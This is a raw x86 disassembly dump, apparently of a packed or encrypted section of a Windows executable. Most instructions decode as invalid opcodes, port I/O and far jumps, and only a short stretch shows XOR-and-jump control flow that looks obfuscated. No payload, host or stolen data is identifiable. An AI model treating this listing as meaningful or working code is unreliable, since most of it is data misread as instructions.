  40a876:	xor    BYTE PTR [ebp-0x6],dh
  40a879:	mov    ds:0xad381780,al
  40a87e:	xor    al,0xd1
  40a880:	sub    bh,dh
  40a882:	and    edi,DWORD PTR [esi]
  40a884:	pop    esp
  40a885:	add    bh,BYTE PTR [eax]
  40a887:	mov    dh,0x2e
  40a889:	jns    0x40a8d1
  40a88b:	push   ss
  40a88c:	hlt    
  40a88d:	mov    esi,edx
  40a88f:	xchg   ecx,eax
  40a890:	adc    BYTE PTR [edx+0x5b],0xd0
  40a894:	jb     0x40a81d
  40a896:	xor    al,0xb1
  40a898:	sbb    al,0x75
  40a89a:	test   ax,0x1007
  40a89e:	outs   dx,DWORD PTR ds:[esi]
  40a89f:	mov    dh,0x0
  40a8a1:	mov    ds:0x590af7ed,al
  40a8a6:	mov    cl,0x20
  40a8a8:	fiadd  WORD PTR [edi+0x24]
  40a8ab:	out    0x1,al
  40a8ad:	xchg   ebp,eax
  40a8ae:	mov    ds:0x72f3b7bb,eax
  40a8b3:	(bad)  
  40a8b4:	mov    bh,0x85
  40a8b6:	js     0x40a8d4
  40a8b8:	xor    edx,edi
  40a8ba:	or     BYTE PTR [esi-0x7d7d7e93],ch
  40a8c0:	pop    ecx
  40a8c1:	sub    al,0xd3
  40a8c3:	(bad)  
  40a8c4:	and    eax,0x97379e3b
  40a8c9:	pushf  
  40a8ca:	in     eax,dx
  40a8cb:	out    0x68,eax
  40a8cd:	inc    ebp
  40a8ce:	and    eax,DWORD PTR ds:0x77e7ecf7
  40a8d4:	or     BYTE PTR [ebx+0xc19b0d],dh
  40a8da:	sti    
  40a8db:	xchg   edi,eax
  40a8dc:	cs mov esp,0x60870cb2
  40a8e2:	aam    0xd3
  40a8e4:	adc    BYTE PTR [eax+0x26d470af],ah
  40a8ea:	sbb    al,0xe9
  40a8ec:	jae    0x40a8a8
  40a8ee:	lods   al,BYTE PTR ds:[esi]
  40a8ef:	je     0x40a91c
  40a8f1:	neg    BYTE PTR [ebp-0x7c]
  40a8f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f5:	dec    ebp
  40a8f6:	cmp    BYTE PTR [edx],cl
  40a8f8:	ins    DWORD PTR es:[edi],dx
  40a8f9:	ss jae 0x40a8d6
  40a8fc:	jmp    0x29d6:0x132b0bf6
  40a903:	xor    BYTE PTR [edi],al
  40a905:	xlat   BYTE PTR ds:[ebx]
  40a906:	push   0xa2121166
  40a90b:	loop   0x40a8f0
  40a90d:	inc    edi
  40a90e:	(bad)  
  40a90f:	and    DWORD PTR [eax-0x15],esi
  40a912:	inc    edx
  40a913:	icebp  
  40a914:	loop   0x40a95b
  40a916:	push   edi
  40a917:	push   ds
  40a918:	mov    eax,ds:0xdb9694dd
  40a91d:	jp     0x40a8a9
  40a91f:	test   eax,0xf40334c3
  40a924:	push   0xffffff8d
  40a926:	ss inc esi
  40a928:	dec    ecx
  40a929:	popa   
  40a92a:	adc    ah,BYTE PTR [eax]
  40a92c:	setbe  al
  40a92f:	or     eax,0x7239b4c7
  40a934:	add    eax,0x566bbe1f
  40a939:	xlat   BYTE PTR ds:[ebx]
  40a93a:	mov    bl,BYTE PTR gs:[eax-0x1698e27]
  40a941:	iret   
  40a942:	pop    ebp
  40a943:	mov    edi,0xe6c398c7
  40a948:	mov    DWORD PTR [eax-0x144c1284],esi
  40a94e:	jne    0x40a8f9
  40a950:	cmc    
  40a951:	push   ds
  40a952:	repz push ebp
  40a954:	xchg   DWORD PTR [ebx],esi
  40a956:	(bad)  
  40a957:	dec    ebp
  40a958:	mov    ch,0xb0
  40a95a:	push   es
  40a95b:	jmp    DWORD PTR [esi]
  40a95d:	push   cs
  40a95e:	loope  0x40a939
  40a960:	mov    bh,0xce
  40a962:	pusha  
  40a963:	dec    esi
  40a964:	or     DWORD PTR [ecx+0x54a8c038],esi
  40a96a:	pop    edx
  40a96b:	call   0x61f81a1
  40a970:	xchg   DWORD PTR [ecx-0x149bdf9],ecx
  40a976:	push   0x29
  40a978:	push   eax
  40a979:	hlt    
  40a97a:	pop    ecx
  40a97b:	imul   ebp,DWORD PTR ds:0x6f5cb8ae,0x6b9a798e
  40a985:	pop    ebp
  40a986:	scas   al,BYTE PTR es:[edi]
  40a987:	ror    ah,0x94
  40a98a:	pop    edx
  40a98b:	dec    ebp
  40a98c:	in     eax,dx
  40a98d:	sbb    al,0xae
  40a98f:	mov    edi,DWORD PTR fs:[edi-0x30911cda]
  40a996:	js     0x40a9fe
  40a998:	xlat   BYTE PTR ds:[ebx]
  40a999:	add    DWORD PTR [esi-0x40a4026a],0xffffffee
  40a9a0:	inc    esp
  40a9a1:	cmp    DWORD PTR [eax-0x5f281397],edx
  40a9a7:	addr16 ja 0x40a9c9
  40a9aa:	aad    0xaf
  40a9ac:	push   ebp
  40a9ad:	nop
  40a9ae:	fsubr  st(4),st
  40a9b0:	dec    ebx
  40a9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9b2:	shl    DWORD PTR [esi+0x4b03afa9],0x25
  40a9b9:	cmp    edx,ebp
  40a9bb:	and    DWORD PTR ds:0xaab74a97,0x77318a7f
  40a9c5:	cmp    ecx,DWORD PTR [ecx]
  40a9c7:	call   0x2346cbdd
  40a9cc:	bound  esi,QWORD PTR [eax-0x239e7fdb]
  40a9d2:	mov    cl,0x87
  40a9d4:	aam    0x52
  40a9d6:	sub    DWORD PTR [ebx+0x65],ecx
  40a9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9da:	lea    eax,[ebx-0x66a6f77b]
  40a9e0:	dec    esp
  40a9e1:	loop   0x40aa01
  40a9e3:	inc    edi
  40a9e4:	(bad)  
  40a9e5:	jmp    0x7c435642
  40a9ea:	out    dx,al
  40a9eb:	cmp    al,0xe0
  40a9ed:	add    eax,DWORD PTR ds:0x67d60670
  40a9f3:	push   ds
  40a9f4:	push   esi
  40a9f5:	ret    
  40a9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f7:	nop
  40a9f8:	pop    ebx
  40a9f9:	jge    0x40aa49
  40a9fb:	pop    edx
  40a9fc:	push   ds
  40a9fd:	js     0x40aa74
  40a9ff:	jno    0x40aa08
  40aa01:	mov    dh,0xbd
  40aa03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa04:	jmp    0xa05c:0x892038d7
  40aa0b:	push   eax
  40aa0c:	stc    
  40aa0d:	std    
  40aa0e:	shl    DWORD PTR [ecx+ebx*8+0x17],1
  40aa12:	dec    ecx
  40aa13:	call   0xeecd33f
  40aa18:	add    eax,0xaec737cd
  40aa1d:	lea    edi,[ecx-0x411cda17]
  40aa23:	les    edx,FWORD PTR [esi]
  40aa25:	bnd ret 0x6c1a
  40aa29:	data16 in al,dx
  40aa2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa2c:	pop    ebp
  40aa2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa2e:	xor    esi,DWORD PTR [edx-0x56]
  40aa31:	or     al,0x2f
  40aa33:	lock loope 0x40aa5f
  40aa36:	(bad)  
  40aa37:	xor    eax,0xa946b7ee
  40aa3c:	cdq    
  40aa3d:	mov    WORD PTR [edx-0x5ced8fd7],ds
  40aa43:	in     eax,0x8c
  40aa45:	ins    DWORD PTR es:[edi],dx
  40aa46:	cmc    
  40aa47:	and    al,0x11
  40aa49:	les    esp,FWORD PTR [eax]
  40aa4b:	inc    edx
  40aa4c:	pop    edx
  40aa4d:	ss stos BYTE PTR es:[edi],al
  40aa4f:	or     eax,0x3664125d
  40aa54:	pop    esi
  40aa55:	jmp    0x40aa25
  40aa57:	jg     0x40aa31
  40aa59:	push   esp
  40aa5a:	out    dx,al
  40aa5b:	add    al,0xae
  40aa5d:	sbb    DWORD PTR [esi+0x39],esp
  40aa60:	push   ds
  40aa61:	add    esi,DWORD PTR [edx+0x39]
  40aa64:	push   0x78
  40aa66:	xchg   ecx,eax
  40aa67:	cwde   
  40aa68:	jne    0x40aa48
  40aa6a:	push   ebp
  40aa6b:	push   0xed47b6b2
  40aa70:	xchg   edi,eax
  40aa71:	popa   
  40aa72:	jbe    0x40aa8c
  40aa74:	out    0x43,al
  40aa76:	cmp    BYTE PTR fs:[ebx+0x44f518c7],ah
  40aa7d:	add    BYTE PTR [eax+ebp*8+0x26],cl
  40aa81:	cmp    DWORD PTR [ecx],eax
  40aa83:	fs leave 
  40aa85:	aad    0x13
  40aa87:	ss out 0xee,eax
  40aa8a:	pop    ebx
  40aa8b:	mul    BYTE PTR gs:[eax]
  40aa8e:	mov    bl,0x50
  40aa90:	jle    0x40aa89
  40aa92:	cs jg  0x40aa4d
  40aa95:	mov    ebx,0x1ced382b
  40aa9a:	sbb    dh,ah
  40aa9c:	mov    ds:0x13817ef8,eax
  40aaa1:	repz js 0x40aa9d
  40aaa4:	je     0x40aacf
  40aaa6:	or     ebp,ebx
  40aaa8:	push   esi
  40aaa9:	sub    cl,bl
  40aaab:	(bad)  
  40aaac:	fisubr DWORD PTR [ebx-0x7e]
  40aaaf:	fs (bad) 
  40aab1:	sbb    DWORD PTR [ecx+ebp*2],edx
  40aab4:	dec    edi
  40aab5:	mov    ecx,0xb37a38e0
  40aaba:	lahf   
  40aabb:	pushf  
  40aabc:	sub    eax,0x215c0f49
  40aac1:	call   0x76ed:0x7276c464
  40aac8:	mul    bl
  40aaca:	xchg   edx,eax
  40aacb:	cld    
  40aacc:	addr16 jbe 0x40aa56
  40aacf:	fwait
  40aad0:	arpl   WORD PTR [edx],si
  40aad2:	arpl   WORD PTR [edi-0x30],cx
  40aad5:	pop    ebx
  40aad6:	adc    dh,ch
  40aad8:	pop    ds
  40aad9:	fldcw  WORD PTR [edx+0x38]
  40aadc:	adc    ah,ah
  40aade:	push   0xffffffed
  40aae0:	fs inc edi
  40aae2:	push   cs
  40aae3:	inc    eax
  40aae4:	lea    edi,[edi]
  40aae6:	pop    ecx
  40aae7:	push   esp
  40aae8:	aaa    
  40aae9:	sti    
  40aaea:	cld    
  40aaeb:	in     eax,dx
  40aaec:	outs   dx,DWORD PTR ds:[esi]
  40aaed:	mov    gs,ebp
  40aaef:	fwait
  40aaf0:	sbb    esp,esp
  40aaf2:	cmp    eax,0x28ea7cf4
  40aaf7:	lods   al,BYTE PTR ds:[esi]
  40aaf9:	or     bh,bl
  40aafb:	outs   dx,DWORD PTR ds:[esi]
  40aafc:	gs inc ebx
  40aafe:	aaa    
  40aaff:	cmp    ecx,DWORD PTR [ebx]
  40ab01:	add    ch,BYTE PTR [esi+ebx*1]
  40ab04:	test   DWORD PTR [ecx-0xf],0xf2dfc54b
  40ab0b:	mov    dh,0x2b
  40ab0d:	inc    ebx
  40ab0e:	xor    ah,dl
  40ab10:	test   eax,0x2173446
  40ab15:	cmp    ah,BYTE PTR [edx+ecx*1-0x25323d1a]
  40ab1c:	xchg   DWORD PTR [edx+0x5a5b23e6],esi
  40ab22:	jmp    0x8fe489f9
  40ab27:	(bad)
  40ab2a:	inc    eax
  40ab2b:	lods   al,BYTE PTR ds:[esi]
  40ab2c:	xor    BYTE PTR [eax-0x3fee760b],bl
  40ab32:	sub    esp,DWORD PTR [esi-0x5]
  40ab35:	dec    ebp
  40ab36:	mov    ?,WORD PTR [ecx-0x5fb1a7b4]
  40ab3c:	popf   
  40ab3d:	scas   al,BYTE PTR es:[edi]
  40ab3e:	aad    0xb8
  40ab40:	xchg   BYTE PTR [esi+0x45437772],ch
  40ab46:	jg     0x40ab09
  40ab48:	fisub  DWORD PTR [ebx]
  40ab4a:	ror    ch,0x1b
  40ab4d:	adc    DWORD PTR ds:0x9bcb219b,ebp
  40ab53:	and    al,0xaf
  40ab55:	pop    ss
  40ab56:	mov    ebp,0x571a9b05
  40ab5b:	and    ch,BYTE PTR [ebx-0x25]
  40ab5e:	fild   WORD PTR [esi-0x71]
  40ab61:	jp     0x40aaed
  40ab63:	push   ds
  40ab64:	mov    WORD PTR [edx+0x2],?
  40ab67:	add    BYTE PTR [edx+0x6d625aad],al
  40ab6d:	push   edx
  40ab6e:	xor    BYTE PTR [edx+0x16],dh
  40ab71:	mov    eax,0x505bbf
  40ab76:	adc    al,ch
  40ab78:	push   ss
  40ab79:	cwde   
  40ab7a:	xlat   BYTE PTR ds:[ebx]
  40ab7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab7c:	mov    ebx,?
  40ab7e:	or     al,cl
  40ab80:	in     eax,0xe4
  40ab82:	sub    ecx,DWORD PTR [eax+0x5600685c]
  40ab88:	pop    esp
  40ab89:	and    eax,0x9650ab7e
  40ab8e:	inc    edx
  40ab8f:	jne    0x40ac08
  40ab91:	and    DWORD PTR [edx+0x6eaea5d8],ebp
  40ab97:	push   0x20
  40ab99:	pop    ds
  40ab9a:	mov    ecx,0x587317c3
  40ab9f:	cmp    DWORD PTR [edx],esi
  40aba1:	repz cwde 
  40aba3:	retf   0x9577
  40aba6:	inc    eax
  40aba7:	aas    
  40aba8:	and    edx,DWORD PTR [edx-0xe6e97cf]
  40abae:	call   ebx
  40abb0:	sahf   
  40abb1:	xchg   ebp,eax
  40abb2:	stos   BYTE PTR es:[edi],al
  40abb3:	(bad)  
  40abb4:	jg     0x40ac13
  40abb6:	mov    ah,0x54
  40abb8:	stc    
  40abb9:	jae    0x40ac10
  40abbb:	sbb    bh,dh
  40abbd:	stgi   
  40abc0:	scas   al,BYTE PTR es:[edi]
  40abc1:	push   ebp
  40abc2:	cmp    eax,DWORD PTR [edx]
  40abc4:	inc    edx
  40abc5:	cmp    al,BYTE PTR [eax+ebp*2-0x3]
  40abc9:	sbb    eax,0x9fdb2bb3
  40abce:	test   BYTE PTR [esp+eax*2+0x17],0x9c
  40abd3:	lods   al,BYTE PTR ds:[esi]
  40abd4:	pop    esp
  40abd5:	lock rol DWORD PTR [edi+0xaa37689],cl
  40abdc:	aam    0xd6
  40abde:	mov    esp,0x20ceeba8
  40abe3:	aad    0xe7
  40abe5:	das    
  40abe6:	jno    0x40ac1c
  40abe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe9:	jl     0x40ac21
  40abeb:	pop    esp
  40abec:	inc    esi
  40abed:	mov    edi,DWORD PTR ds:0x6f6b84cf
  40abf3:	rcr    DWORD PTR [ecx-0xe],1
  40abf6:	mov    ebp,0xd5219702
  40abfb:	leave  
  40abfc:	push   ds
  40abfd:	pusha  
  40abfe:	loopne 0x40ab83
  40ac00:	xchg   ebx,eax
  40ac01:	pop    es
  40ac02:	fst    QWORD PTR ds:0x942367d
  40ac08:	enter  0xf536,0x98
  40ac0c:	adc    ah,BYTE PTR [edx+ecx*8]
  40ac0f:	cmp    eax,0x6a33e852
  40ac14:	mov    fs,WORD PTR [ebx]
  40ac16:	xor    al,0x91
  40ac18:	sbb    BYTE PTR [ecx+0x7e],dl
  40ac1b:	add    eax,0x34a2aa1e
  40ac20:	sub    eax,0x5056ccda
  40ac25:	in     eax,0x6e
  40ac27:	daa    
  40ac28:	dec    ebp
  40ac29:	jl     0x40ac16
  40ac2b:	fnsave [ecx+0x2a]
  40ac2e:	mov    eax,ds:0xfd9552a7
  40ac33:	dec    edi
  40ac34:	pop    edx
  40ac35:	into   
  40ac36:	fcmovne st,st(3)
  40ac38:	sbb    edx,ecx
  40ac3a:	fxam   
  40ac3c:	imul   eax,DWORD PTR [edx-0x1de81b48],0x1c165c0d
  40ac46:	repz jns 0x40aca8
  40ac49:	sti    
  40ac4a:	jle    0x40acb6
  40ac4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac4d:	es cmc 
  40ac4f:	pop    es
  40ac50:	xchg   esp,eax
  40ac51:	mov    ebp,0x705c8587
  40ac56:	and    eax,0xf3af78dc
  40ac5b:	outs   dx,DWORD PTR ds:[esi]
  40ac5c:	lahf   
  40ac5d:	pop    ds
  40ac5e:	xor    al,0x31
  40ac60:	leave  
  40ac61:	ror    BYTE PTR [eax-0x40a33b34],0x95
  40ac68:	push   eax
  40ac69:	pop    ds
  40ac6a:	imul   esi,esi,0x75
  40ac6d:	xchg   ebx,eax
  40ac6e:	mov    dl,0x89
  40ac70:	xor    eax,DWORD PTR [edi+0x2e]
  40ac73:	jnp    0x40acd5
  40ac75:	mov    ecx,0x7ce24275
  40ac7a:	pop    esi
  40ac7b:	inc    ecx
  40ac7c:	mov    al,0x1e
  40ac7e:	ja     0x40acf6
  40ac80:	adc    eax,0x169c3a7a
  40ac85:	nop
  40ac86:	(bad)  
  40ac87:	bound  edi,QWORD PTR [eax-0x71cae8b5]
  40ac8d:	mov    esi,0x7de7ddc4
  40ac92:	adc    eax,0x300ea04f
  40ac97:	fst    QWORD PTR [ecx]
  40ac99:	add    al,0x9c
  40ac9b:	cmp    al,0x7d
  40ac9d:	fnsave [esi-0x5c]
  40aca0:	mov    ds:0x9beba512,eax
  40aca5:	inc    esi
  40aca6:	lds    ebx,FWORD PTR [esi+0x3a]
  40aca9:	push   0x65
  40acab:	int3   
  40acac:	push   es
  40acad:	sub    BYTE PTR [edi+0x41],dl
  40acb0:	repz xor eax,0xadd825ff
  40acb6:	push   ebp
  40acb7:	add    dh,BYTE PTR [edx+0x9b76837]
  40acbd:	mov    cl,0x97
  40acbf:	jmp    0xe032:0x69fbcf83
  40acc6:	arpl   bp,dx
  40acc8:	ror    ebx,0x11
  40accb:	das    
  40accc:	inc    edx
  40accd:	(bad)  
  40acce:	outs   dx,BYTE PTR ds:[esi]
  40accf:	enter  0xdad9,0x52
  40acd3:	bound  eax,QWORD PTR [esi-0x3c]
  40acd6:	int3   
  40acd7:	(bad)  
  40acd9:	pushf  
  40acda:	and    bh,ah
  40acdc:	enter  0xf4b5,0x96
  40ace0:	scas   eax,DWORD PTR es:[edi]
  40ace1:	adc    eax,0xdd742625
  40ace6:	ret    0x34ab
  40ace9:	call   0xa82a:0xd76d8d9c
  40acf0:	sub    esi,DWORD PTR [eax]
  40acf2:	jecxz  0x40ad69
  40acf4:	lahf   
  40acf5:	or     esi,esi
  40acf7:	sub    esp,DWORD PTR [eax+0x7d47893c]
  40acfd:	mov    edi,0xc9642d85
  40ad02:	out    0x1b,eax
  40ad04:	retf   
  40ad05:	icebp  
  40ad06:	popa   
  40ad07:	stos   DWORD PTR es:[edi],eax
  40ad08:	mov    cl,0x80
  40ad0a:	or     al,0xbb
  40ad0c:	leave  
  40ad0d:	sub    eax,0x1d0c8cdd
  40ad12:	ss (bad) 
  40ad14:	shr    BYTE PTR [edi],1
  40ad16:	inc    edx
  40ad17:	and    edx,DWORD PTR [ecx+0x58a22a80]
  40ad1d:	lods   al,BYTE PTR ds:[esi]
  40ad1e:	add    eax,0x64a742ad
  40ad23:	and    DWORD PTR [esi],esp
  40ad25:	inc    esi
  40ad26:	xor    al,0x74
  40ad28:	push   edi
  40ad29:	and    BYTE PTR [esi+0x79a7ea77],bl
  40ad2f:	pushf  
  40ad30:	sub    ecx,edx
  40ad32:	ja     0x40ad0f
  40ad34:	mov    eax,ds:0x3ef63bba
  40ad39:	data16 je 0x40ad4c
  40ad3c:	xchg   esi,eax
  40ad3d:	jmp    FWORD PTR [edi]
  40ad3f:	pop    edi
  40ad40:	mov    eax,ss:0xdd2ed595
  40ad46:	sbb    DWORD PTR ds:[edi+0x53],esp
  40ad4a:	daa    
  40ad4b:	sbb    edi,DWORD PTR [ebx+0x6e]
  40ad4e:	mov    DWORD PTR [edi+0x37563cbf],ebx
  40ad54:	sbb    ebp,DWORD PTR [esi-0x677e54f2]
  40ad5a:	mov    ch,0x39
  40ad5c:	test   ax,cx
  40ad5f:	sub    al,0x29
  40ad61:	outs   dx,BYTE PTR ds:[esi]
  40ad62:	ret    0x70c8
  40ad65:	sub    edx,DWORD PTR [esi]
  40ad67:	mov    BYTE PTR [edi-0x76723d3f],ah
  40ad6d:	pop    edx
  40ad6e:	rol    DWORD PTR [ecx],cl
  40ad70:	cli    
  40ad71:	mov    ds:0xcf06fb09,al
  40ad76:	arpl   WORD PTR [esi+0x2e],cx
  40ad79:	sbb    al,0xad
  40ad7b:	xor    al,0xdd
  40ad7d:	pand   mm4,QWORD PTR [esi+ebp*8+0x25b9a408]
  40ad85:	cmp    ebp,ebp
  40ad87:	jno    0x40ada3
  40ad89:	retf   
  40ad8a:	ret    0x5925
  40ad8d:	loopne 0x40ada7
  40ad8f:	xor    cl,BYTE PTR [eax-0x1c193632]
  40ad95:	ja     0x40ad53
  40ad97:	dec    eax
  40ad98:	(bad)  
  40ad99:	mov    cl,0x1c
  40ad9b:	lea    esp,[ecx-0xbe6bc9a]
  40ada1:	mov    dh,0xc5
  40ada3:	ins    BYTE PTR es:[edi],dx
  40ada4:	iret   
  40ada5:	js     0x40ad8d
  40ada7:	jmp    0x1feea599
  40adac:	hlt    
  40adad:	call   0x7c6de898
  40adb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adb3:	push   edi
  40adb4:	mov    edx,0xbe51ff15
  40adb9:	mov    ecx,0xef013bd5
  40adbe:	mov    al,0x4e
  40adc0:	fldcw  WORD PTR [ecx+0x773ee8ba]
  40adc6:	cmp    bh,BYTE PTR [esi-0x65]
  40adc9:	lock and al,0xf9
  40adcc:	inc    esp
  40adcd:	inc    edx
  40adce:	mov    ds:0x34d8a3cb,al
  40add3:	sbb    bl,BYTE PTR [ecx+ebx*2-0x398125d3]
  40adda:	dec    ebp
  40addb:	imul   esi,DWORD PTR [edi+0x42],0x5644d84b
  40ade2:	inc    esi
  40ade3:	outs   dx,DWORD PTR ds:[esi]
  40ade4:	mov    eax,ds:0x5d1bedf2
  40ade9:	pop    esp
  40adea:	(bad)  
  40adec:	sbb    eax,0xd71503f
  40adf1:	ins    BYTE PTR es:[edi],dx
  40adf2:	(bad)
  40adf5:	push   ecx
  40adf6:	mov    ah,0xf5
  40adf8:	test   al,0xe5
  40adfa:	repnz lods al,BYTE PTR ds:[esi]
  40adfc:	mov    edx,DWORD PTR [edi-0x47]
  40adff:	pop    es
  40ae00:	xlat   BYTE PTR ds:[ebx]
  40ae01:	scas   al,BYTE PTR es:[edi]
  40ae02:	push   ecx
  40ae03:	retf   0x2fa
  40ae06:	cmp    BYTE PTR [ebx-0x3f],bh
  40ae09:	dec    ebp
  40ae0a:	call   0x4038:0x4ece322b
  40ae11:	jno    0x40adf8
  40ae13:	mov    dh,0x86
  40ae15:	stos   BYTE PTR es:[edi],al
  40ae16:	cmp    DWORD PTR [ecx-0x32566140],eax
  40ae1c:	dec    edx
  40ae1d:	ss push 0xffffff88
  40ae20:	inc    ebp
  40ae21:	sahf   
  40ae22:	and    BYTE PTR [ebp-0x7f],dl
  40ae25:	cmp    DWORD PTR [ecx+ecx*4],ebp
  40ae28:	int3   
  40ae29:	pop    edi
  40ae2a:	fs jb  0x40ae97
  40ae2d:	stos   BYTE PTR es:[edi],al
  40ae2e:	ins    BYTE PTR es:[edi],dx
  40ae2f:	scas   eax,DWORD PTR es:[edi]
  40ae30:	adc    eax,0xb3f0219
  40ae35:	les    eax,FWORD PTR [esi+0x75c95888]
  40ae3b:	popa   
  40ae3c:	mov    ch,0x7e
  40ae3e:	ror    BYTE PTR [edi],0x31
  40ae41:	in     eax,0xed
  40ae43:	repnz sahf 
  40ae45:	sbb    eax,0xe077440c
  40ae4a:	dec    ebx
  40ae4b:	and    bl,BYTE PTR [ecx]
  40ae4d:	shr    BYTE PTR [eax],1
  40ae4f:	cmp    DWORD PTR [ebp-0x14],edi
  40ae52:	cwde   
  40ae53:	mov    ebp,0xe9e937b8
  40ae58:	sub    edx,DWORD PTR ss:[edx-0x7163b1d6]
  40ae5f:	jecxz  0x40ae6d
  40ae61:	test   eax,0x9a88fb4b
  40ae66:	push   0xffffff8c
  40ae68:	enter  0xce27,0x33
  40ae6c:	mov    eax,0x34759433
  40ae71:	cld    
  40ae72:	cli    
  40ae73:	lea    ebx,[edx-0x2e]
  40ae76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae77:	add    ebx,ebx
  40ae79:	out    dx,al
  40ae7a:	pop    esp
  40ae7b:	or     DWORD PTR [ebx-0x6e],esp
  40ae7e:	clc    
  40ae7f:	clc    
  40ae80:	sbb    esi,DWORD PTR [ebx]
  40ae82:	xchg   edx,eax
  40ae83:	add    ebx,DWORD PTR [ecx+ebx*2-0xfbf3d75]
  40ae8a:	fld    DWORD PTR [edi]
  40ae8c:	push   cs
  40ae8d:	inc    eax
  40ae8e:	test   DWORD PTR [edx],ebp
  40ae90:	xchg   esp,eax
  40ae91:	and    al,0x6
  40ae93:	mov    dl,BYTE PTR [edx]
  40ae95:	jle    0x40ae8f
  40ae97:	stos   DWORD PTR es:[edi],eax
  40ae98:	outs   dx,BYTE PTR ds:[esi]
  40ae99:	add    ebx,ebx
  40ae9b:	(bad)  
  40ae9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9d:	and    al,0xda
  40ae9f:	xor    eax,0x187d79ee
  40aea4:	aam    0x34
  40aea6:	iret   
  40aea7:	int3   
  40aea8:	aad    0x49
  40aeaa:	scas   eax,DWORD PTR es:[edi]
  40aeab:	movzx  eax,WORD PTR [eax+ebx*2]
  40aeaf:	mov    ecx,DWORD PTR [ebp-0x14]
  40aeb2:	mov    eax,DWORD PTR [ecx+eax*4]
  40aeb5:	mov    DWORD PTR [ebp-0x38],eax
  40aeb8:	jmp    0x408aae
  40aebd:	mov    eax,DWORD PTR [ebp-0xc]
  40aec0:	xor    eax,esi
  40aec2:	lea    ebx,[ebx+eax*1+0x3272fa]
  40aec9:	jmp    0x4087a7
  40aece:	mov    eax,DWORD PTR [ebp-0x4]
  40aed1:	xor    eax,esi
  40aed3:	add    eax,edi
  40aed5:	jmp    0x40d3b1
  40aeda:	mov    eax,DWORD PTR [ebp-0x38]
  40aedd:	add    eax,DWORD PTR [ebp+0x8]
  40aee0:	mov    DWORD PTR [ebp-0x18],eax
  40aee3:	jmp    0x40d298
  40aee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee9:	fisubr WORD PTR [esi]
  40aeeb:	jbe    0x40af63
  40aeed:	jbe    0x40aed6
  40aeef:	outs   dx,BYTE PTR ds:[esi]
  40aef0:	xchg   BYTE PTR [ebx-0x618a58d0],al
  40aef6:	adc    al,0x8a
  40aef8:	or     BYTE PTR [ecx],0x7b
  40aefb:	jnp    0x40af10
  40aefd:	pushf  
  40aefe:	jnp    0x40af7b
  40af00:	iret   
  40af01:	mov    ch,0x7f
  40af03:	pop    ecx
  40af04:	cmp    ebx,eax
  40af06:	int    0xec
  40af08:	hlt    
  40af09:	sub    al,0xad
  40af0b:	aas    
  40af0c:	adc    eax,0x1f9d0efc
  40af11:	mov    edi,0xab5dff7e
  40af16:	mul    BYTE PTR [edx+0x3c]
  40af19:	in     al,dx
  40af1a:	enter  0xfab,0xb5
  40af1e:	sbb    eax,0xbfa262a6
  40af23:	int3   
  40af24:	fcom   st(3)
  40af26:	add    eax,0xd6d7dd01
  40af2b:	adc    edi,DWORD PTR [esi-0x628be94f]
  40af31:	mov    ds:0xfd2b9d0f,al
  40af36:	clc    
  40af37:	std    
  40af38:	sub    edx,eax
  40af3a:	fcmovnbe st,st(4)
  40af3c:	dec    ecx
  40af3d:	xor    BYTE PTR [eax+0x65],dh
  40af40:	add    DWORD PTR [ebx-0x52a6126a],ecx
  40af46:	popf   
  40af47:	repz jle 0x40af35
  40af4a:	xchg   ecx,eax
  40af4b:	sub    bl,BYTE PTR [ecx-0x1da7f165]
  40af51:	inc    esp
  40af52:	mov    cl,0x98
  40af54:	in     eax,0x8b
  40af56:	outs   dx,BYTE PTR ds:[esi]
  40af57:	int3   
  40af58:	xchg   esp,eax
  40af59:	imul   esi,esp,0x8783870b
  40af5f:	(bad)  
  40af61:	cmp    al,0x59
  40af63:	fst    QWORD PTR [esi]
  40af65:	pop    esi
  40af66:	mov    al,ds:0x33333ea9
  40af6b:	(bad)  
  40af6c:	sub    DWORD PTR [eax],esi
  40af6e:	sbb    bl,BYTE PTR [ebx-0x4e8c53c0]
  40af74:	icebp  
  40af75:	mov    esi,DWORD PTR [eax-0xbc3f361]
  40af7b:	fidiv  DWORD PTR [edx]
  40af7d:	jmp    0xc310705c
  40af82:	fstp   DWORD PTR [ecx+0x5e]
  40af85:	jns    0x40afb6
  40af87:	and    ecx,DWORD PTR [edi+0x40]
  40af8a:	mov    dh,0xec
  40af8c:	loope  0x40b007
  40af8e:	daa    
  40af8f:	inc    edi
  40af90:	xchg   esi,eax
  40af91:	or     eax,DWORD PTR [ecx+ebp*1+0x6cae207e]
  40af98:	jecxz  0x40afdb
  40af9a:	mov    ebp,0x82bf0f04
  40af9f:	push   edx
  40afa0:	jmp    0x1159:0x178776c9
  40afa7:	fcomi  st,st(4)
  40afa9:	dec    ecx
  40afaa:	mov    edi,0x685115fd
  40afaf:	pop    ds
  40afb0:	aaa    
  40afb1:	hlt    
  40afb2:	and    edx,DWORD PTR [ecx+0x2a]
  40afb5:	add    eax,0xa478a8ef
  40afba:	div    BYTE PTR [ecx]
  40afbc:	mov    eax,ds:0x18f576f1
  40afc1:	xchg   ecx,eax
  40afc2:	jmp    0x40af5a
  40afc4:	or     DWORD PTR [ecx],0x75
  40afc7:	loope  0x40afce
  40afc9:	mov    ds:0x119cd4f0,al
  40afce:	push   0x3bddcca3
  40afd3:	pop    esp
  40afd4:	xchg   esi,eax
  40afd5:	cmc    
  40afd6:	add    DWORD PTR [eax*1-0x7304271f],0xe51cded8
  40afe1:	sbb    ecx,esp
  40afe3:	mov    bl,0xb2
  40afe5:	sbb    ecx,edi
  40afe7:	and    BYTE PTR [ebx-0x61e170c6],ch
